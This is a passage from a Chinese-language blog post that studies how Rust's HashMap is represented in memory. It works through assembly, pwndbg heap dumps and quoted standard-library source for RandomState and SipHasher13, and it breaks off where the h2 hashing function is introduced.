<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/28/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/28/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-7/" class="post-title-link" itemprop="url">Rust逆向学习 (7)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-28 20:59:52" itemprop="dateCreated datePublished" datetime="2023-11-28T20:59:52+08:00">2023-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-13 23:50:53" itemprop="dateModified" datetime="2023-12-13T23:50:53+08:00">2023-12-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-hashmap"><a class="markdownIt-Anchor" href="#reverse-for-hashmap"></a> Reverse for HashMap</h1>
<p>HashMap是各个语言常用的一种数据结构，在每个语言中的实现都有或多或少的差别，相信学过数据结构的都知道HashMap在数据量较大时具有很小的时间复杂度。下面我们将分析在Rust中，HashMap在内存中的表示方式。</p>
<h2 id="new-insert-get"><a class="markdownIt-Anchor" href="#new-insert-get"></a> <code>new</code> / <code>insert</code> / <code>get</code></h2>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">map</span>: HashMap&lt;<span class="type">u64</span>, <span class="type">u64</span>&gt; = HashMap::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    map.<span class="title function_ invoke__">insert</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, map.<span class="title function_ invoke__">get</span>(&amp;<span class="number">1u64</span>).<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上面的代码为例。我们分段看一下对应的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">    sub     rsp, 200</span><br><span class="line">    mov     rax, qword ptr [rip + std::collections::hash::map::HashMap&lt;K,V&gt;::new@GOTPCREL]</span><br><span class="line">    lea     rdi, [rsp + 48]</span><br><span class="line">    mov     qword ptr [rsp + 40], rdi</span><br><span class="line">    call    rax</span><br><span class="line">    mov     rdi, qword ptr [rsp + 40]</span><br><span class="line">    mov     rax, qword ptr [rip + std::collections::hash::map::HashMap&lt;K,V,S&gt;::insert@GOTPCREL]</span><br><span class="line">    mov     esi, 1</span><br><span class="line">    mov     edx, 2</span><br><span class="line">    call    rax</span><br><span class="line">    jmp     .LBB157_3</span><br></pre></td></tr></table></figure>
<p>上面的代码包含了<code>new</code>和<code>insert</code>两个操作，通过调试发现，<code>new</code>方法与字符串、可变数组的<code>new</code>类似，都是传入要初始化的栈指针。在初始化完成之后，这部分栈的数据如下所示，貌似看不出来什么特殊的地方。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7fffffffd910</span><br><span class="line">00:0000│ rax rdi 0x7fffffffd910 —▸ 0x5555555a62d0 ◂— 0xffffffffffffffff</span><br><span class="line">01:0008│         0x7fffffffd918 ◂— 0x0</span><br><span class="line">... ↓            2 skipped</span><br><span class="line">04:0020│         0x7fffffffd930 ◂— 0x419fa2b4be855595</span><br><span class="line">05:0028│         0x7fffffffd938 ◂— 0x944210c733652a9b</span><br></pre></td></tr></table></figure>
<p>往下是插入方法的调用，参数类型也很明显，第一个为HashMap栈指针，第二个是Key，第三个是Value。我们要重点看一下调用后HashMap的内存结构长啥样。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7fffffffd910</span><br><span class="line">00:0000│  0x7fffffffd910 —▸ 0x5555555bebe0 ◂— 0xffffffffff45ffff</span><br><span class="line">01:0008│  0x7fffffffd918 ◂— 0x3</span><br><span class="line">02:0010│  0x7fffffffd920 ◂— 0x2</span><br><span class="line">03:0018│  0x7fffffffd928 ◂— 0x1</span><br><span class="line">04:0020│  0x7fffffffd930 ◂— 0x419fa2b4be855595</span><br><span class="line">05:0028│  0x7fffffffd938 ◂— 0x944210c733652a9b</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x5555555beb90</span><br><span class="line">00:0000│     0x5555555beb90 ◂— 0x0</span><br><span class="line">01:0008│     0x5555555beb98 ◂— 0x61 /* &#x27;a&#x27; */</span><br><span class="line">02:0010│ r9  0x5555555beba0 ◂— 0x0</span><br><span class="line">03:0018│     0x5555555beba8 ◂— 0x0</span><br><span class="line">04:0020│ rcx 0x5555555bebb0 ◂— 0x1</span><br><span class="line">05:0028│     0x5555555bebb8 ◂— 0x2</span><br><span class="line">06:0030│     0x5555555bebc0 ◂— 0x0</span><br><span class="line">07:0038│     0x5555555bebc8 ◂— 0x0</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│     0x5555555bebd0 ◂— 0x0</span><br><span class="line">09:0048│     0x5555555bebd8 ◂— 0x0</span><br><span class="line">0a:0050│ rdi 0x5555555bebe0 ◂— 0xffffffffff45ffff</span><br><span class="line">0b:0058│     0x5555555bebe8 ◂— 0xffffffffffffffff</span><br><span class="line">0c:0060│     0x5555555bebf0 ◂— 0xff45ffff</span><br><span class="line">0d:0068│     0x5555555bebf8 ◂— 0x20411</span><br><span class="line">0e:0070│     0x5555555bec00 ◂— 0x0</span><br><span class="line">0f:0078│     0x5555555bec08 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>可以看到，0x5555555beb90应该就是与HashMap相关的数据结构，下面的0x20411是top chunk的大小，后面的内容不属于这个chunk。值得注意的是，这个chunk中确实保存了我们插入的数据，后面还有一些由0xFF组成的未知数据结构。这样看来，单插入一个数据看不出来它的具体实现方式，因此这里尝试多插入一些结构，看看内存的变化。</p>
<p>不看不知道，一看发现，其中的玄机还挺大。在HashMap的栈对象内存空间中，我们在最后可以看到有一个被像是随机数一类的数据占用的0x10大小的内存空间，从IDA反编译可以得知，这是<code>std::collection::hash_map::RandomState</code>实例。这又是一个什么东西呢？</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    k0: <span class="type">u64</span>,</span><br><span class="line">    k1: <span class="type">u64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="meta">#[allow(deprecated)]</span></span><br><span class="line">    <span class="meta">#[must_use]</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;hashmap_build_hasher&quot;</span>, since = <span class="string">&quot;1.7.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> RandomState &#123;</span><br><span class="line">        thread_local!(<span class="keyword">static</span> KEYS: Cell&lt;(<span class="type">u64</span>, <span class="type">u64</span>)&gt; = &#123;</span><br><span class="line">            Cell::<span class="title function_ invoke__">new</span>(sys::<span class="title function_ invoke__">hashmap_random_keys</span>())</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        KEYS.<span class="title function_ invoke__">with</span>(|keys| &#123;</span><br><span class="line">            <span class="keyword">let</span> (k0, k1) = keys.<span class="title function_ invoke__">get</span>();</span><br><span class="line">            keys.<span class="title function_ invoke__">set</span>((k0.<span class="title function_ invoke__">wrapping_add</span>(<span class="number">1</span>), k1));</span><br><span class="line">            RandomState &#123; k0, k1 &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面的Rust内核部分源码可以看到，这里保存的确实是两个随机数，经过测试发现，两个随机数的值每一次执行都不一样。</p>
<p>那么，HashMap为什么需要这样一个结构呢？继续往下看源码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">BuildHasher</span> &#123;</span><br><span class="line">    <span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Hasher</span>: Hasher;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">build_hasher</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>::Hasher;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;build_hasher_simple_hash_one&quot;</span>, since = <span class="string">&quot;1.71.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">hash_one</span>&lt;T: Hash&gt;(&amp;<span class="keyword">self</span>, x: T) <span class="punctuation">-&gt;</span> <span class="type">u64</span></span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        <span class="keyword">Self</span>: <span class="built_in">Sized</span>,</span><br><span class="line">        <span class="keyword">Self</span>::Hasher: Hasher,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">build_hasher</span>();</span><br><span class="line">        x.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        hasher.<span class="title function_ invoke__">finish</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[stable(feature = <span class="string">&quot;hashmap_build_hasher&quot;</span>, since = <span class="string">&quot;1.7.0&quot;</span>)]</span></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">BuildHasher</span> <span class="keyword">for</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Hasher</span> = DefaultHasher;</span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="meta">#[allow(deprecated)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">build_hasher</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> DefaultHasher &#123;</span><br><span class="line">        <span class="title function_ invoke__">DefaultHasher</span>(SipHasher13::<span class="title function_ invoke__">new_with_keys</span>(<span class="keyword">self</span>.k0, <span class="keyword">self</span>.k1))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从<code>RandomState</code>对<code>BuildHasher</code>这个Trait进行impl的情况来看，<code>HashMap</code>使用的是<code>SipHasher13</code>这种Hash算法。这种算法多用于短消息的哈希，是一个伪随机函数族，可作为消息认证的MAC函数使用，具有安全、快速、简洁等特点。具体的算法参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43936250/article/details/123736554">传送门</a>。HashMap在每一次<code>insert</code>与<code>get</code>的时候都会使用这个Hash函数进行计算。</p>
<p>好，现在我们知道HashMap使用什么哈希函数进行计算了，并且通过上面的分析也能够得出下面的结论：<strong>在一个Rust进程中，即使是泛型类型完全相同的两个HashMap结构，对于同一个Key所计算出的Hash值也几乎是不可能相同的，因为所使用的SipHasher算法的两个key值是随机生成的，对于不同的key值，计算出来的Hash值也不同。</strong></p>
<p>分析出使用的Hash函数后，我们可以开始解决其他的问题了。第一：这些Hash值在什么地方保存？第二：之前在堆中看到的大部分是0xFF的那一堆数据到底有什么用？</p>
<p>首先解决第一个问题。在调试中通过检查内存情况发现，这些Hash值没有保存在栈或堆中。没有保存在栈好理解，毕竟一个HashMap可能有很多个Hash值，全保存在栈里很可能爆栈的。但是堆空间也没有找到就很有意思了。从IDA反汇编的结果来看，在<code>insert</code>和<code>get</code>内部还调用了其他的方法。在<code>insert</code>中：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">insert</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, k: K, v: V) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;V&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hash</span> = make_hash::&lt;K, S&gt;(&amp;<span class="keyword">self</span>.hash_builder, &amp;k);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hasher</span> = make_hasher::&lt;_, V, S&gt;(&amp;<span class="keyword">self</span>.hash_builder);</span><br><span class="line">    <span class="keyword">match</span> <span class="keyword">self</span></span><br><span class="line">        .table</span><br><span class="line">        .<span class="title function_ invoke__">find_or_find_insert_slot</span>(hash, <span class="title function_ invoke__">equivalent_key</span>(&amp;k), hasher)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(bucket) =&gt; <span class="title function_ invoke__">Some</span>(mem::<span class="title function_ invoke__">replace</span>(<span class="keyword">unsafe</span> &#123; &amp;<span class="keyword">mut</span> bucket.<span class="title function_ invoke__">as_mut</span>().<span class="number">1</span> &#125;, v)),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(slot) =&gt; &#123;</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                <span class="keyword">self</span>.table.<span class="title function_ invoke__">insert_in_slot</span>(hash, slot, (k, v));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="literal">None</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里使用hash值（不可变变量<code>hash</code>）的关键方法有<code>find_or_find_insert_slot</code>和<code>insert_in_slot</code>这两个。整个<code>insert</code>方法的逻辑和Rust中对于HashMap的插入操作逻辑相同——当Key存在时，使用新的Value替换旧的Value；当Key不存在时，将Key插入并添加Value。在上面的<code>insert</code>内核方法中，k即为新的Key，v即为新的Value。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">find_or_find_insert_slot</span>(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    hash: <span class="type">u64</span>,</span><br><span class="line">    <span class="keyword">mut</span> eq: <span class="keyword">impl</span> <span class="title class_">FnMut</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">bool</span>,</span><br><span class="line">    hasher: <span class="keyword">impl</span> <span class="title class_">Fn</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Bucket&lt;T&gt;, InsertSlot&gt; &#123;</span><br><span class="line">    <span class="keyword">self</span>.<span class="title function_ invoke__">reserve</span>(<span class="number">1</span>, hasher);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span></span><br><span class="line">            .table</span><br><span class="line">            .<span class="title function_ invoke__">find_or_find_insert_slot_inner</span>(hash, &amp;<span class="keyword">mut</span> |index| <span class="title function_ invoke__">eq</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">bucket</span>(index).<span class="title function_ invoke__">as_ref</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// SAFETY: See explanation above.</span></span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(index) =&gt; <span class="title function_ invoke__">Ok</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">bucket</span>(index)),</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(slot) =&gt; <span class="title function_ invoke__">Err</span>(slot),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">find_or_find_insert_slot_inner</span>(</span><br><span class="line">    &amp;<span class="keyword">self</span>,</span><br><span class="line">    hash: <span class="type">u64</span>,</span><br><span class="line">    eq: &amp;<span class="keyword">mut</span> <span class="keyword">dyn</span> <span class="title function_ invoke__">FnMut</span>(<span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">bool</span>,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">usize</span>, InsertSlot&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">insert_slot</span> = <span class="literal">None</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">h2_hash</span> = <span class="title function_ invoke__">h2</span>(hash);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">probe_seq</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">probe_seq</span>(hash);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">group</span> = <span class="keyword">unsafe</span> &#123; Group::<span class="title function_ invoke__">load</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">ctrl</span>(probe_seq.pos)) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> <span class="variable">bit</span> <span class="keyword">in</span> group.<span class="title function_ invoke__">match_byte</span>(h2_hash) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">index</span> = (probe_seq.pos + bit) &amp; <span class="keyword">self</span>.bucket_mask;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(<span class="title function_ invoke__">eq</span>(index)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(insert_slot.<span class="title function_ invoke__">is_none</span>()) &#123;</span><br><span class="line">            insert_slot = <span class="keyword">self</span>.<span class="title function_ invoke__">find_insert_slot_in_group</span>(&amp;group, &amp;probe_seq);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(group.<span class="title function_ invoke__">match_empty</span>().<span class="title function_ invoke__">any_bit_set</span>()) &#123;</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">fix_insert_slot</span>(insert_slot.<span class="title function_ invoke__">unwrap_unchecked</span>()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        probe_seq.<span class="title function_ invoke__">move_next</span>(<span class="keyword">self</span>.bucket_mask);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到了吗？上面的unsafe方法<code>find_or_find_insert_slot_inner</code>中有一个<code>h2</code>方法：</p>
